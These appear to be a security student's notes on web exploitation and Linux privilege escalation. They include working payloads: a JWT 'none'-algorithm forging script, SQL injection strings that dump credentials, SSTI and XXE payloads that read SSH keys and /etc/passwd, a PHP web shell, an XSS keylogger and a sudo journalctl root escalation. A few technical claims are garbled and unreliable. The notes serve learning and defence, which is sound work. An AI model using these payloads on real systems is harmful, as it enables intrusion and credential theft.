= Vulnerability

== Websites

=== Authenticate

==== Dictionary Attack
Brute force credentials using an existing dictionary of commonly used username/passwords

Tools used: Hydra, Medusa, Burp Suite, ZAP

==== JSON Web Token
Normally, we could use brute force/dictionary attack to find the secret used for encrypting the JWT and then used that to generate new tokens.

If the JWT is not properly validated on the server, an attacker could change the header to set the alg to None and change the payload which will ignore the signature part.

We then encode the header and the payload as base64 and ignore the signature part.

This gives us a token like this eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.

where the 3rd part is missing.

Replace the requests headers with this token.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token[JWT payload and tool]

===== Public key is known (HS256)
A typical JWT header looks like this

[source,json]
----
{
    "typ": "JWT",
    "alg":"RS256"
}
----

RS256 uses a private RSA key (known by the server), HS256 is the server's public key. We may have access to the public key, so we may use that.

RS256 doesn't have any vulnerabilities for the moment.

If we know the public key

1. we can change the header to HS256
2. re-encode it in base64
3. convert the public key to hex so openssl will use it (cat a | xxd -p | tr -d "\\n")
** a is the file with the public key
** xxd -p turns the contents of a file to hex
** tr gets rid of any newlines
4. use openssl to sign that as valid HS256 key (echo "our base64 jwt" | openssl ...)
5. decode that hex to binary data and reencode it in base64 (use Python)
6. use that output where the secret should go and the server should accept it

===== None algorithm
Some libraries don't follow RFC and allow vulnerability where an attacker can switch to the None algorithm and have the token valid without secret validation.

We just replace the last part after updating the header: base64(header).base64(payload).

Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
[source,json]
----
{"type": "JWT", "alg": "none"}
----

[source,bash]
----
#!/usr/bin/env bash

if [ $# -eq 0 ] ; then
 echo "USAGE: $0 jwt"
 exit
fi

jwt=$1
part1=$(echo -n $jwt | cut -f1 -d'.' | base64 -di | sed 's/HS256/none/g'| base64)
part2=$(echo -n $jwt | cut -f2 -d'.' | base64 -di | sed 's/user/admin/g' | base64)

echo ""
echo $part1.$part2. | tr -d ' ='
----

===== Brute force secret
JWT HS256 is calculated using a secret with the calculation:

HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

If we have the full JWT token, the header and the payload, we can potentially brute force the secret to sign our own JWT tokens.

Tool to use: https://github.com/lmammino/jwt-cracker[jwt-cracker]

Commmand: jwt-cracker <token> [alphabet] [max-length]

|===
|Token |The HS256 JWT token

|Alphabet
|The alphabet that the cracker will use to check the passwords (default: abc...xyz)

|max-length
|The max expected length of the secret (default: 12)

|===

==== No Auth
Use URL parameters to access other parts of the system.

http://10.10.173.12:7777/users/1

Change the ID to another value and see if we get other information while not being authenticated.

Use technical ID like UUID instead of incremental IDs.

==== Re-registration
Register a user using a name that exists using whitespace admin -> " admin". This will actually register a new user but that user will have the same right as normal admin.

Cause: developer mistake

=== Command injection / Remote Code Execution
Command injection is the abuse of an application's behaviour to execute commands on the OS using the same privileges that the application on a device is running with.

[source,php]
----
$title = $_GET["title"];
$command = "grep $title /var/www/html/songtitle.txt";
$search = exec($command);
----

[source,python]
----
import subprocess

def execute_command(shell):
    return subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE).stdout.read()
----

==== Discovery
This vulnerability exists because applications often use functions in programming languages such as PHP, Python, NodeJS to pass data to and to make system calls on the machine's OS. For example, taking input from a field and searching an entry into a file.

Applications that use user input to populate system commands with data can often be combined in unintended behaviour.

Command injection can be detected in mostly one of two ways

|===
|Method |Description |Test

|Blind
|No direct output from the app when testing payloads. Need to investigate the behaviours of the app to determine if successful or not.
|Create delays with ping or sleep to test. Use cURL

|Verbose
|Direct feedback from the app like a display of the result.
|Check if whoami gets displayed.

|===

===== Linux payloads
|===
|Payload |Description

|whoami
|See what user the application is running under.

|ls
|List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.

|ping
|This command will invoke the application to hang. This will be useful in testing an application for blind command injection.

|sleep
|This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed.

|nc
|Netcat can be used to spawn a reverse shell onto the vulnerable application. We can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.

|===

===== Windows payloads
|===
|Payload |Description

|whoami
|See what user the application is running under.

|dir
|List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.

|ping
|This command will invoke the application to hang. This will be useful in testing an application for blind command injection.

|timeout
|This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the ping command is not installed.
|===

==== Remediation
In PHP, need to sanitize input of functions such as exec, passthru, system, ...

Input sanitisation -> specify format/types of data that the user can submit.
[source,php]
----
if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {}
----

==== Bypass
To bypass that, we can use hexadecimal value such as "\x2f\x65\x74...\x64" as this will still be executed and not be filtered.

https://github.com/payloadbox/command-injection-payload-list

=== SSRF (Server-Side Request Forgery)
Vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

Types of SSRF:

* regular where data is returned to the attacker's screen
* blind where SSRF occurs but no information is returned to the attacker's screen

If working with a blind SSRF where no output is reflected back to us, we'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, our own HTTP server or Burp Suite's Collaborator client.

Successful SSRF attack:

* access to unauthorized areas
* access to customer/organisational data
* ability to scale to internal networks
* reveal authentication tokens/credentials

==== Finding an SSRF
Four common places to look:

|===
|Place |Example

|when a full URL is used in a parameter in the address bar
|https://website.thm/form?server=http://server.website.thm/store

|hidden field in a form
|<input type="hidden" name="server" value="http://server.website.thm/store">

|partial URL such as just the hostname
|https://website.thm/form?server=api

|path of the URL
|https://website.thm/form?dst=/forms/contact

|===

==== Example
|===
|Expected URL |Hacker requests |Website requests |Explanation

|http://website.com/stock?url=http://api.website.com/stock/item?id=123
|url=http://api.website.com/api/user
|http://api.website.com/api/user
|Complete control of the URL to use

|http://website.com/stock?url=/item?id=123
|url=/../user
|http://api.website.com/api/stock/../user
|Using directory traversal to remove the /stock portion of the request and turns the final request into /api/user

|http://website.com/stock?server=api&id=123
|/stock?server=api.website.com/api/user&x=&id=123
|http://api.website.thm/api/user?x=.website.com/api/stock/item?id=123
|Payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string

|http://website.com/stock?url=http://api.website.com/api/stock/item?id=123
|http://website.com/stock?url=http://hacker-domain.com/
|None
|Returns data from hacker-domain.com instead of api.website.com revealing the API key

|===

==== Defeating common SSRF defenses

===== Deny List
Deny List where all requests are accepted apart from resources specified in a list of matching a particular pattern.  A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations.

localhost and 127.0.0.1 will likely be found in a deny list. This can be bypassed using alternative localhost reference such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io

In a cloud environment (AWS), also block 169.254.169.254 which contains metdata for the deployed cloud server. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP address 169.254.169.254

==== Allow List
Everything gets denied unless they appear on a list or match a particular pattern such as a rule that an URL used in a parameter must begin with https://website.thm which can be bypassed with subdomain: https://website.thm.attackers-domain.thm -> the application logic would now allow this input and let an attacker control the internal HTTP request.

If this does not work, we can look for *open redirect* like https://website.thm/link?url=https://tryhackme.com

This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

=== CSRF (Cross Site Request Forgery)
When a user visits a page on a site, that performs an action on a different site. This works because it is the victim making the request not the site, so all the site sees is a normal user making a normal request.

Check if parameters can be customized and the session cookie is automatically set.

[source,html]
----
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
----

Use tool like xsrfprobe to automatically test for CSRF.

[source,shell]
-----
pip3 install xsrfprobe
-----

=== LFI (Local File Inclusion)
* Mostly found in web servers
* Exploited when a user input contains a certain path to the file which might be present on the server and will be included in the output.
* Used to read files containing sensitive and confidential data from the vulnerable system -> ssh private key

Cause: improper sanitization of the user's input

Example: https://tryhackme.com/?file=robots.txt or ?page=xxx

==== Links
https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks[LFI payload]

=== XSS (Cross-Site Scripting)
Injection that can allow an attacker to execute malicious scripts and have it execute on a victim's machine.

Possible in JavaScript, VBScript, FLash and CSS

Cause: unsanitized user input

Severity depends on the type of XSS (persistent/stored and reflected).

|===
|Action |Description

|Cookie stealing
|Steal cookie from authenticated session

|Keylogging
|Register keyboard event listener and send all keystrokes somewhere else

|Webcam snapshot
|HTML5 capabilities

|Phishing
|Insert fake login forms or redirect to a clone of a site tricking us into revealing our sensitive data

|Port scanning
|Can use stored XSS to scan an internal network and identify other hosts on their network

|Other browser based exploits
|Millions of possibilities with XSS

|===

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://beefproject.com/

https://XSS-Payloads.com

==== Stored XSS
Most dangerous type of XSS -> attacker inserts malicious string in the database. XSS payload is stored on the web application and then gets run when other users visit the site or web page.

If this string is displayed on the website, all users will see it (comments added to a page, ...)

Commonly found in blog posts.

document.cookie contains the session cookie of a user

Cause: unsanitized user input

Process:

1. Try to add a comment: <!-- comment --> and check the resulting page
2. Try an alert()
3. Try changing some value : document.getElementById("thm-title").innerHTML = "Changed";

===== Test
Need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to:

* comments on a blog
* user profile information
* website listings

Try to manually send request rather than using the form of a website. Sometimes, only client side (drop down menu) are checked, not the data sent to the server.

==== Blind XSS
Similar to a stored XSS in that the payload gets stored on the website for another user to view, but we can't see the payload working or be able to test it against ourself first.

Example: contact form where the message gets turned into support tickets on a private web portal

===== Test
When testing for blind XSS vulnerabilities, we need to ensure that our payload has a callback (HTTP request) to know if/when our code is being executed.

Popular tool: https://xsshunter.com/[xsshunter]

==== Reflected XSS
Malicious payload is part of the victim's request to the website. The website includes this payload in response back to the user.

Cause: user clicked a URL that executes the malicious payload

Example: http://example.com/search?keyword=<script>...</script>

Commonly found when the server doesn't sanitize search data.

The victim's browser executes the payload inside the response

The main difference between reflected and DOM based XSS, is that with reflected XSS our payload (string in this case) gets inputted directly into the page. No Javascript is loaded beforehand, neither is anything processed in the DOM beforehand.

[source, html]
----
<html>
    You searched for <em><script>...</script></em>
</html
----

===== Test
Need to test every possible point of entry:

* parameters in the URL query string
* URL file path
* sometimes HTTP headers (unlikely exploitable in practice)

==== DOM-Based XSS
Document Object Model is a programming interface for HTML and XML documents. It represents a page so that programs can change the document structure, style and content.

Commonly uses the <script></script> or <iframe src="javascript:alert(`xss`)"> HTML tag.

Websites that allow the user to modify the iframe or other DOM elements will most likely be vulnerable to XSS.

https://www.w3.org/TR/REC-DOM-Level-1/introduction.html

JavaScript can create dynamic HTML using the DOM.

In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed.

[source,javascript]
-----
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
-----

Example: https://portswigger.net/web-security/cross-site-scripting/dom-based

Example payload:

[source,javascript]
-----
    <script>
      document.querySelector('#update').addEventListener("click", function() {
        let imgURL = document.querySelector('#img-url').value // input URL
        const imgEl = document.querySelector('#img') // Image div element
        imgEl.innerHTML = '<img src="' + imgURL + '" alt="Image not found.." width=400>' // Creating image element
      });
    </script>
-----

We need to find a way to write imgURL to do some actions.

[source,javascript]
-----
1" onmouseover="document.body.style.backgroundColor = 'red'" width=400><!--

1" onerror=alert(cookie.cookie)><!--
-----

===== Test
Challenging to test for as we need to look for parts of the code that access certain variables that we have control over such as "window.location.x" parameters.

When found, check how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().

==== Using XSS for IP and Port Scanning
On the application layer, the browser has no notion of internal and external IP addresses. Any website is able to tell the browser to request a resource from the internal network.

What will affect the results: response times, firewall rules, cross origin policies and more

[source,html]
----
<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
----

[source,javascript]
----
<script>
for (let i = 0; i < 256; i++) {
    let ip = '192.168.0.' + i
    let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
    document.body.innerHTML += code
}
</script>
----

==== XSS Keylogger

[source,javascript]
-----
 <script type="text/javascript">
    let l = ""; // Variable to store key-strokes in
    document.onkeypress = function (e) { // Event to listen for key presses
        l += e.key; // If user types, log it to the l variable
        console.log(l); // update this line to post to our server
    }
</script>
-----

==== Filter Evasion
If JavaScript tags (script, ...) are filtered, we can counter that with:

[source,html]
----
<img src=x onerror=alert("Hello");>

<object onerror=alert('Hello')>
----

Check XSS cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

==== Protection Methods & Other Exploits
* escape all user input: disallow < and > from being rendered
* validate input: disallow certain characters from being submitted in the first place
* sanitize: change unacceptable user input into an acceptable format like "<" into HTML entity "&#60;"

=== XXE (XML Eternal Entity)
Abuses features of XML parsers/data. Allow an attacker to interact with any backend or external systems that the application itself can access and read the file on that systsem. This uses the ENTITY feature of XML to load resources from outside the website directory.

Attacker can also cause Denial of Service attack or could use XXE to perform Server-Side Request Forgery (SSRF) to make requests to other applications.

2 types:

* in-band XXE: receive immediate response to the XXE payload
* out-of-band XXE / blind XXE: no immediate response, need to output result to some other file or their own server

Since the application doesn't necessarily have to return data, we may not be able to get the contents of the external entity but we may be able to use the php expect module to get Remote Code Execution (RCE) anyway.

==== Discover
To discover potential attacks, check the XML sent in the request. After sending the request, do we receive some information about the XML fields in the output? If so, we may be able to view the contents of files on the file system.

Create an entity that has the value /etc/passwd using https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe[PayloadsAllTheThings - GitHub]

XXE can't really be automatically exploited, as we can't guarantee xml data will be the same, and which payload will or won't work. By the time we figure out that it's vulnerable and make a script to exploit it, we could have a reverse shell or LFI already using burp.

==== Payload

Define an entity and use it in our code
[source, xml]
----
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
----

Define an entity "read" with value SYSTEM and path to file in order for a website vulnerable to XXE to display the content of the file.

Or use the php expect module if it is loaded.

[source, xml]
----
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'expect://id'>]>
<root><email>&xxe;</email></root>
----

=== SSTI (Server Side Template Injection)
When a user is able to pass in a parameter that can control the template engine that is running on the server.

Different template engines have different injection payloads, however usually we can test for SSTI using {{2+2}} as a test.

[source,python]
-----
{{config.__class__.__init__.__globals__['os'].popen('/etc/passwd').read()}}

{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/kali/.ssh/id_rsa').read()}}
-----

Use tool tplmap to test what's available.

[source,shell]
-----
./tplmap.py -u http://10.10.229.70/ -d 'name' --os-cmd 'cat /etc/passwd'
-----

|===
|HTTP Method |Syntax

|GET
|tplmap -u <url>/?<vulnparam>

|POST
|tplmap -u <url> -d '<vulnparam>'

|===

==== Links

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection[Template injectsion - GitHub]

https://github.com/epinna/tplmap[tplmap - Github]

=== SQL Injection / SQLi
Attack on a web application database server that cause malicious queries to be executed. This happens when user-provided data gets included in the SQL query.

3 types: In-Band, Blind and Out-of-Band.

==== Example
An endpoint like https://website.thm/blog?id=1 could be transformed to a SQL query like

[source,sql]
----
SELECT * from blog where id=1 and private=0 LIMIT 1;
----

If the article 2 is still private, we could potentially access it like this https://website.thm/blog?id=2;--

which would produce this query
[source,sql]
----
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
----
; end the command and -- creates comment

==== In-Band SQLi
Easiest to detect and exploit -> discover vulnerability and extract data from the database on the same page.

*Error-Based SQL Injection*: get info about database structure as error messages from the DB. Printed directly on the browser screen. Used to enumerate a whole database.

*Union-Based SQL Injection*: uses SQL UNION alongside a SELECT statement to return additional results to the page. Most common way of extracting large amounts of data.

===== Practical
Key is to break the code's SQL query by trying certain characters until an error message is produced => use ' or "

Then we need to return data to the browser without displaying the error message. Try UNION first to get extract result.

For example with URL http://website.thm/article?id=1

[source,sql]
----
1 UNION SELECT 1
----

We get error

SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns

We need to return the same number of columns.

[source,sql]
----
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
----
Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that.

To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.

[source,sql]
----
0 UNION SELECT 1,2,3
----

Now the result is made up of the result from the UNION select.

[source,sql]
----
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
----

group_concat() gets the specified column (table_name) from multiple returned rows and puts them into one string separacted by commas.

information_schema: every user of the DB has access to this and contains information about all the databases and tables the user has access to.

[source,sql]
----
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
----

==== Blind SQLi - Authentication Bypass
No feedback is returned from injection. Most straightforward Blind SQLi technique is when bypassing authentication methods such as login forms.

Application is not interested in the content of the username and password but only if there is DB info that matches user input. Reply must be a boolean so we need to create a query that returns true.

For password field, use ' OR 1=1;-- to transform the query.

[source,sql]
-----
select * from users where username='' and password='' LIMIT 1;
select * from users where username='' and password='' OR 1=1;
-----

==== Blind SQLi - Boolean Based
Response we receive that can only ever has two outcomes (true/false, yes/no, on/off, 1/0, ...).

[source,sql]
----
select * from users where username = 'admin' LIMIT 1
----

As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.

First establish the number of columns in the users table using UNION

[source,sql]
----
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2;--
admin123' UNION SELECT 1,2,3;--
----

Then we discover info about DB using like operator to return a true status.

[source,sql]
----
admin123' UNION SELECT 1,2,3 where database() like '%';--
----
We get a true response because of the wildcard. Now we try different values like 'a%', 'b%' until we discover a match.

After that, we do the same with tables

[source,sql]
----
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
----

And finally the column names.

[source,sql]
----
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';'

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
----

We discover columns id, username, password that we can use in queries.

[source,sql]
----
admin123' UNION SELECT 1,2,3 from users where username like 'a%

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
----

==== Blind SQLi - Time Based
Very similar to boolean based but there is no visual indicator that our queries are wrong or right. The indicator is now the time it took the query to complete using SLEEP(X) alongside the UNION statement. The SLEEP() method will only be executed upon a successful UNION select statement.

[source,sql]
----
admin123' UNION SELECT SLEEP(5);--

admin123' UNION SELECT SLEEP(5),2;--
----

If there was no pause in the response time, we know that the query was unsuccessful.

Once we find the number of columns, we repeat the enumeration process like boolean based SQLi with database() and wildcard, then columns, ...

==== Out-of-Band SQLi
Not as common as it depends on specific features being enabled on the database server or the web app business logic which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service we control.

1. Attacker makes a request to a website with an injection payload
2. website makes an SQL query to the DB which also passes the payload
3. payload contains a request which forces an HTTP request back to the attacker's machine containing data from the DB

==== Remediation
Always use prepared statements with parameterized queries. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data.

Input validation of what goes into the SQL query: allow list to restrict input of only certain strings, string replacement method to filter characters.

Escaping user input with a \ before to be parsed as regular string and not special character: ' " $ \

=== File upload
If we have an upload point on a site:

* look page source code for any client-side filtering
* scan directories with gobuster
* check upload requests with burpsuite
* check extension Wappalyser for information about the site

==== Overwriting existing files
When uploading a file, a range of checks should be done on the server to ensure that the file will not overwrite anything that already exists on the server.

* assign file with a new name (random, date time, ...)
* check if file already exists and raise error if that's the case
* file permissions to protect against overwrite (web pages should not be writeable to the web user)

==== Remote code execution
Most likely low privileged web user account (www-data on Linux server). RCE through a web application tends to be a result of uploading a program written in the same language as the backend of the website (PHP, Python, JS, ...).

===== Web shell
take a parameter and execute it

[source,php]
----
<?php
    echo system($_GET["cmd"]);
?>
----

After uploading the file

[source,shell]
----
curl http://shell.uploadvulns.thm/resources/webshell.php?cmd=id
----

Whe using webshells, it is usually easier to view the output by looking at the source code of the page -> improves formatting of the output

===== Reverse shell
Ideal goal. Almost identical than a webshell; use Ã¨[Pentest Monkey reverse shell tool].

Upload it and access it after starting nc

[source, bash]
----
nc -lvnp 1234
----

==== Filtering
Client-side filtering: running in the user's browser. Filtering done before the file is uploaded on the server. Highly insecure because we can disable it ourselves.

Server-side filtering: PHP, ASP, Python, Ruby, JS, ... more difficult to bypass because we don't know the code. We need a payload which conforms the filters in place but still allows us to execute our code.

===== Extension validation
In theory, used to identify the contents of a file. Can be changed easily, so they don't mean much but MS Windows still uses them to identify file types. The file extension can either be blacklisted or whitelisted.

====== Bypass
If .php is blacklisted, we can try variant like .php3, .php7, .phps, ... check wikipedia for more. The webserver will need to consider the uploaded files as php. This is not the default for Apache2 servers but we still need to try in case that works.

Try shell.jpg.php in case the filter simply looks for .jpg in the file name for instance.

===== File type filtering
MIME validation (multipurpose internet mail extension) is used as an identifier for files, found in the header of the request (Content-Type). MIME is based on the extension of the file so easy to bypass.

Magic Number validation: more accurate way of determining the contents of a file but can be faked. It is a string of bytes at the very beginning of the file content which identify the content. Unix systems use magic numbers for identifying files.

====== Bypass
Use magic number https://en.wikipedia.org/wiki/List_of_file_signatures[Magic number wikipedia]

If the magic number we want to use is 4 bytes long, add 4 chars at the top of the file and use a hex editor to replace them with the magic number.

===== File length filtering
Used to prevent huge files from being uploaded.

===== File name filtering
File name should be unique, sanitized (contains no bad characters like null bytes, forward slashes on Linux, semi colon and potentially unicode characters).

If we can bypass the filtering, we may need to go hunting for our shell.

===== File content filtering
Scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. High complexity for bypassing.

===== Bypass client side filtering
* turn off Javascript in our browser if the site doesn't require it
* intercept and modify the incoming page before the browser can run the javascript filter
* intercept and modify the file upload. Real file passes the filter and we replace it
* send the file directly to the upload point without executing the javascript
[source,bash]
----
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
----

Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If we need to edit a script which is not inside the main page being loaded, we'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|

== Operating Systsems

=== Privilege Escalation
Become superuser another user from a user.

If we have access to a simple user, we can type sudo -l and see what the user can access without password

[source, shell]
----
falcon@walk:~$ sudo -l
User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl

falcon@walk:~$ sudo /bin/journalctl
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

----

==== Links

https://blog.mzfr.me/posts/2020-02-1-linux-priv-esc/[Linux Privilege Escalation]

http://gtfobins.github.io/

http://github.com/mzfr/gtfo

